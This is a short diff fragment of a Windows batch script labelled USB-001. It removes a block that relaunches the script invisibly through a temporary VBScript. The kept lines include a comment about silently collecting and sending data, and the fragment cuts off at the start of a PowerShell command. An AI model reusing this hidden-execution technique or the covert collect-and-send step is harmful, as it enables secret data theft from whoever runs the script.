@@ -5,13 +5,6 @@
 :: ===========================================================
 set USB_ID=USB-001
  
-:: If not already running silently, relaunch self via VBS with no window
-if "%1"=="silent" goto :run
-echo Set WshShell = CreateObject("WScript.Shell") > "%temp%\silent_usb.vbs"
-echo WshShell.Run "cmd.exe /c ""%~f0"" silent", 0, False >> "%temp%\silent_usb.vbs"
-start "" wscript.exe "%temp%\silent_usb.vbs"
-exit /b
- 
  
 :: Silently collect and send data
 powershell -NoProfile -NonInteractive -Command ^
